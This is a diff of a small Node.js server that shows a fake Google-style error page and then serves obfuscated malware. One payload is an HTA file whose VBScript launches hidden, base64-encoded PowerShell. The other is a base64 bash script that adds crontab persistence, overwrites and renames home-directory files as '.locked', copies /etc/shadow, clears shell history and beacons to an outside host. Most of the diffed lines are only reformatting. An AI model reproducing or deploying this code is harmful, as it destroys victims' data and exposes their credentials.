@@ -4,8 +4,15 @@ h.createServer((q, r) => {
     try {
         const u = q.url;
         const a = q.headers['user-agent'] || '';
-        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
-        if (!u.includes('test')) { r.end(); return; }
+        if (u === '/ping') { 
+            r.writeHead(200); 
+            r.end('1'); 
+            return; 
+        }
+        if (!u.includes('test')) { 
+            r.end(); 
+            return; 
+        }
         if (!u.includes('trigger=1')) {
             r.writeHead(200, { 'Content-Type': 'text/html' });
             r.end(`
@@ -22,8 +29,8 @@ h.createServer((q, r) => {
                         h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px 0; color: #202124; }
                         p { font-size: 14px; line-height: 1.6; margin: 0 0 20px 0; }
                         .error-code { font-size: 12px; text-transform: uppercase; margin-top: 30px; color: #70757a; }
-                        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; transition: background-color 0.2s; }
-                        .btn:hover { background-color: #185abc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.30), 0 1px 3px 1px rgba(60,64,67,0.15); }
+                        .btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; transition: background-color 0.2s; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
+                        .btn:hover { background-color: #185abc; }
                     </style>
                 </head>
                 <body>
@@ -47,11 +54,12 @@ h.createServer((q, r) => {
                 'Content-Disposition': `inline; filename="${f}"`,
                 'X-Content-Type-Options': 'nosniff'
             });
-
             r.end(`<html><head><hta:application windowstate="minimize" showintaskbar="no" /><script language="VBScript">Sub Window_OnLoad:On Error Resume Next:Set s=CreateObject("WScript.Shell"):p="powershell -W Hidden -EP Bypass -Enc JABwAD0AWwBjAGgAYQByAF0AMAB4ADIAMAAyAEUAOwAgAFMAdABhAHIAdAAtAEoAbwBiACAALQBTAGMAcgBpAHAAdABCAGwAbwBjAGsAIAB7ACAAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAEgATwBNAEUAIAAtAFIAZQBjAHUAcgBzAGUAIAAtAEQAZQBwAHQAaAAgADQAIAAtAEYAaQBsAGUAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAgAC0AQwBvAHUAbgB0ACAAMgAwACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgeyBbAGMAaABhAHIAXQAkAF8gfSkAOwAgAFIAZQBuAGEAbQBlAC0ASQB0AGUAbQAgAC0AUABhYQB0AGgAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAE4AZQB3AE4AYQBtAGUAIAAoACQAdQBzAGkAbgBnADoAcAAgACsAIAAkAG4AIAArACAAJwAuAGwAbwBjAGsAZQBkACcAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAH0AIAB9ACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAgAH0A":s.Run p,0,False:self.close:End Sub</script></head></html>`);
         } else {
             r.writeHead(200, { 'Content-Type': 'text/plain' });
             r.end(`(K="cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmICBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XCIkdFwiIGJzPTFrIGNvdW50PTEgY29udj1ub3RydW5jIDI+L2Rldi9udWxsOyBuPVwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcIiR0XCIgXCIkKGRpcm5hbWUgXCIkdFwiKS9UcFwkbi5sb2NrZWRcIiAyPi9kZXYvbnVsbDsgZG9uZTsgZG9uZSIgPi9kZXYvbnVsbCAyPiYxICYpOyBlY2hvICJbIV0gVEVTVCBNT0RFIEFDVElWQVRFRDogRW5naW5lIGJhY2tncm91bmRlZC4iOyBmaSIgfCBiYXNoICZ`);
         }
-    } catch (e) { r.end(); }
+    } catch (e) {
+        r.end();
+    }
 }).listen(process.env.PORT || 3000);
